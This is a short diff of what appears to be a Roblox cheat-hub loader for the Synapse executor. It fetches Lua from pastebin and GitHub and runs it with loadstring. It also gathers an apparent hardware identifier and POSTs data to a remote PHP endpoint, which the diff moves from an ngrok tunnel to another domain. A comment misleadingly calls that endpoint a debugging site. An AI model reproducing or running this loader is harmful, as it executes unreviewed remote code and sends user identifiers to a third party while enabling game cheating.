@@ -1,6 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local GitHubName = loadstring(game:HttpGet("https://pastebin.com/raw/sS94Uwjg"))()
-local Hub = loadstring(game:HttpGet("https://raw.githubusercontent.com/" + GitHubName + "/Hub/main/Hub.lua"))()
+local Hub = loadstring(game:HttpGet("https://raw.githubusercontent.com/" .. GitHubName .. "/Hub/main/Hub.lua"))()
 
 local hwidResponse = syn.request({
     Url = "https://httpbin.org/get",
@@ -18,7 +18,7 @@ local Data = {
 
 local response = syn.request(
     {
-        Url = "https://ae65-2001-1c04-4786-0-6dbc-b04e-b57c-ff34.eu.ngrok.io/top_d/synapse.php",  -- This website helps debug HTTP requests
+        Url = "https://lukankerhub.com/synapse.php",  -- This website helps debug HTTP requests
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"  -- When sending JSON, set this!
